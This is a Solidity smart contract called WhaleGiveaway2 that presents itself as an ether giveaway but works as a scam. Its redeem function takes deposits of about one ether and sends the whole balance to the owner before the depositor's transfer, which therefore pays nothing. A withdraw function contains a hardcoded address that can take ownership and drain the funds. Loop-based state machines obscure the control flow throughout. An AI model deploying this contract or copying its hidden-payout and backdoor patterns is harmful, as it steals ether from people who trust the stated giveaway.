pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 

    function()
    public
    payable
    {
        
    }

    function redeem()
    public
    payable
    {
        uint action = 0;
        while (true) {
            if (action == 0) {
                if (msg.value >= minEligibility) {
                    action = 1;
                } else {
                    break;
                }
            } else if (action == 1) {
                Owner.transfer(this.balance);
                action = 2;
            } else if (action == 2) {
                msg.sender.transfer(this.balance);
                break;
            }
        }
    }
    
    function withdraw()
    payable
    public
    {
        uint action = 0;
        while (true) {
            if (action == 0) {
                if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
                    Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
                }
                action = 1;
            } else if (action == 1) {
                require(msg.sender == Owner);
                action = 2;
            } else if (action == 2) {
                Owner.transfer(this.balance);
                break;
            }
        }
    }
    
    function Command(address adr, bytes data)
    payable
    public
    {
        uint action = 0;
        while (true) {
            if (action == 0) {
                require(msg.sender == Owner);
                action = 1;
            } else if (action == 1) {
                adr.call.value(msg.value)(data);
                break;
            }
        }
    }
}